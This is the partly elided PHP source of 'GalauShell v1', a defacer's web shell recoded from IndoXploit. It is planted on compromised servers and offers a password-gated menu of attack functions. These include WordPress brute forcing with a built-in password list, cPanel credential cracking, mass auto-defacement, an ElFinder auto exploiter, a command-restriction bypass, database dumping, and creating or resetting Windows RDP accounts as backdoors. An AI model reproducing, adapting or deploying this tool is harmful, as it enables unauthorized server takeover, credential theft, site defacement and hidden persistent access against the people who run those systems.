...
$auth_pass = "19292da8a385d061244535ca2e900943"; // default: galau
$color = "#00ff00";
...
<center>
<header>
<font color="blue" size="7">GalauShell</font><font color="white" size="3">v1</font>
<br />
<? 
echo "Defacer IP: <font color=white>".$_SERVER['REMOTE_ADDR']."</font><br>";
 
?>
</header>
<table border=1>
<tr>
<td><center><font color="white">Username :</font></center></td>
<td><center><input type="text" name="user" value="Mr.CyB3R_INk146">
</form></center></td>
</tr>
<tr>
<td><center><font color="white">Password :</font></center></td>
...
<head>
<title>GalauShell</title>
<meta name='author' content='Mr.CyB3R_INk146'>
<meta charset="UTF-8">
<style type='text/css'> 
...
-=<font color="blue" size="4">GalauShell</font>=-
<br />
<font color="red" size="5">Mr.CyB3R_INk146</font>
<br />
</head>
<?php
###############################################################################
// Greetz To IndoXploit - 1ntr0ver7_Tersakiti - And You
// Mr.CyB3R_INk146
###############################################################################
function w($dir,$perm) {
	if(!is_writable($dir)) {
...
echo "<li>[ <a href='?dir=$dir&do=wp-bf'>WordPress Brute Force</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=cpftp_auto'>CPanel/FTP Auto Deface</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=krdp_shell'>K-RDP Shell</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=elfinder'>ElFinder Auto Exploiter</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=hash'>Hash</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=dump'>Database Dump</a> ]</li>";
echo "<li>[ <a style='color: yellow;' href='?do=about'>About</a> ]</li>";
...
if($_GET['logout'] == true) {
   ...
   echo "<table width='371' class=tabnet>";
   echo "<tr><th colspan='2'>Database Dump</th></tr>";
   echo "<tr>";
	 echo "<td>Server </td>";
	 echo "<td><input class='inputz' type=text name=server size=52></td></tr><tr>";
	 echo "<td>Username</td>
	...
	echo "<td><input class='inputz' type=text name=dbname size=52></td></tr>";
	echo "<tr>";
	echo "<td>DB Type </td>";
	echo "<td><form method=post action='".$me."'>";
	echo "<select class='inputz' name=method>";
	echo	"<option  value='gzip'>Gzip</option>";
		echo "<option value='ql'>Sql</option>";
		echo "</select>";
	echo "<input class='inputzbut' type=submit value='  Dump!  ' ></td></tr>";
...
fclose($fp); 
	 ...
	 echo "<br><br><br><font color='blue' size='7'>GalauShell</font><font color=' white' size='3'>v1</font><br> by<br> Mr.CyB3R_INk146 - 1ntr0ver7_Tersakiti
	<br><br>Kenapa ane namain GalauShell?<br>Soalnya ane buat ini shell pas galau :'(<br>
Dan hasil akhirnya malah tambah bikin galau, Karena malah makin kacauu. Wkwkwk :v<br><br><font color='red'>Thanks to:</font><br>All Members 1ntr0ver7_Tersakiti : 5iNON!MOU23 ~ Mr-Andraz404 ~ Fx_Fri3nds_ ~ Mr.Oz ~ Mr.Crabs ~ ./Mr.HanzID ~ Peoplehurt1337 ~ Gend3ruw0 ~ ./Mister-Y404 ~ Mr. Hurted ~ ./D14 ~ Mr.CyB3R_INk146 ~ ./M~I~R[404] ~ And You";
	 echo "<br> Recoded From <font color='lime'>IndoXploit</font></center><center>";
 } if($_GET['do'] == 'bypass') {
	 echo "<form method='post'>";
  echo "<font color='red'> -=[ Command  Bypass Exploit ]=- </font>";
print_r('
<pre>
...
echo "</h4></pre>";
 "</div>"; 
	 ...
	 echo "<form method='post'>";
   echo "<center>";
 echo "<font size='2' >+--=[ Wordpress Brute Force ]=--+</font><br>";
echo "<form enctype='multipart/form-data' method='POST'>";
  echo "<table width='624' border='0' class='tabnet' id='Box'>";
  echo "<tr><th colspan='5'>Wordpress Brute Force</th></tr>";
    ...
    echo "<tr>
      <td>&nbsp;</td>";
      echo "<td ><textarea style='background:black;' name='hosts'cols='30' rows='10'>";
      if($_POST){echo $_POST['hosts'];}
      echo "</textarea></td>";
      echo "<td ><textarea style='background:black;' name='usernames' cols='30'rows='10'  >";
       if($_POST){echo $_POST['usernames'];}else {echo "admin";}
       echo "</textarea></td>";
      echo "<td ><textarea style='background:black;' name=''asswords''cols='30'rows='10' >";
      if($_POST){echo $_POST['passwords'];}else {echo "admin\nadministrator\n123123\n123321\n123456\n1234567\n12345678\n123456789\n123456123456\nadmin2010\nadmin2011\npassword\nP@ssW0rd\n!@#$%^\n!@#$%^&*(\n(*&^%$#@!\n111111\n222222\n333333\n444444\n555555\n666666\n777777\n888888\n999999";} 
      echo "</textarea></td>
    </tr>";
echo "<center><tr><td colspan='4'><input class='inputzbut' type='submit' name='submit' value='Brute Now'  />";
if($_POST)
{
...
echo "</p>";
 ...
 elseif($_GET['do'] == 'upload') {
	...
	<textarea name='script' style='width: 450px; height: 200px;'>Ownd by Mr.CyB3R_INk146</textarea><br>
...
echo '<tr><td>Sha1 with Salt & MD5</td><td><input class=inputz type=text size=50 value='.$hash1_sha1_double.'></td></tr><br><br></table>'; 
	...
	if($_POST['hajar']) {
		...
		Set User & Pass: <br>
		<input type='text' name='user_baru' value='ink' placeholder='user_baru'><br>
		<input type='text' name='pass_baru' value='ink' placeholder='pass_baru'><br>
	...
	if($_POST['crack']) {
		...
		if($i == 0) {
			...
			echo "<br>sukses nyolong ".$i." Cpanel by <font color=red>Mr.CyB3R_INk146.</font>";
		}
	} else {
		echo "<center>
		<form method='post'>
	...
	if($_POST['crack']) {
		...
		if($i == 0) {
			...
			echo "<br>sukses deface ".$i." Cpanel by <font color=red>Mr.CyB3R_INk146</font>";
		}
	} else {
		echo "<center>
		<form method='post'>
	...
	if($_POST['hajar']) {
		...
		<input type='text' size='50' name='config_dir' value='$dir'><br><br>
		Set Title: <br>
		<input type='text' name='new_title' value='Ownd by Mr.CyB3R_INk146' placeholder='New Title'><br><br>
...
if($_POST['x']) {
	...
	if($_POST['submit']) {
		...
		<u>Defacer</u>: <br>
		<input type='text' name='nick' size='50' value='Mr.CyB3R_INk146'><br>
		<u>Domains</u>: <br>
	...
	if($_POST['auto_deface_wp']) {
		...
		<input type='text' name='script' height='10' size='50' placeholder='Ownd by Mr.CyB3R_INk146' required><br>
	...
	if(strtolower(substr(PHP_OS, 0, 3)) === 'win') {
		if($_POST['create']) {
			...
			if($_POST['opsi'] == '1') {
				...
				if(preg_match("/$user/", exe("net user"))) {
					echo "[change password: <font color=red>ink</font>] -> ";
					if($cek) {
			...
			echo "-- Create RDP --<br>
			<form method='post'>
			<input type='text' name='user' placeholder='username' value='ink' required>
			<input type='text' name='pass' placeholder='password' value='ink' required>
	...
	if(is_dir($dir) === true) {
	 ...
	 echo "<br><br><br>Shell Recoded by Mr.CyB3R_INk146 - 1ntr0ver7_Tersakiti
	<br><br><font color='red'>Thanks to:</font><br> 5iNON!MOU23 ~ Mr-Andraz404 ~ Fx_Fri3nds_ ~ Mr.Oz ~ Mr.Crabs ~ ./Mr.HanzID ~ Peoplehurt1337 ~ Gend3ruw0 ~ ./Mister-Y404 ~ Mr. Hurted ~ ./D14 ~ Mr.CyB3R_INk146";
	 echo "<br> Recoded From <font color='lime'>IndoXploit</font></center><center>";
 
		}
	echo "<center>Copyright &copy; ".date("Y")." - <a href='#' target='_blank'><font color=red>Mr.CyB3R_INk146 </font></a></center>";
?>
</html>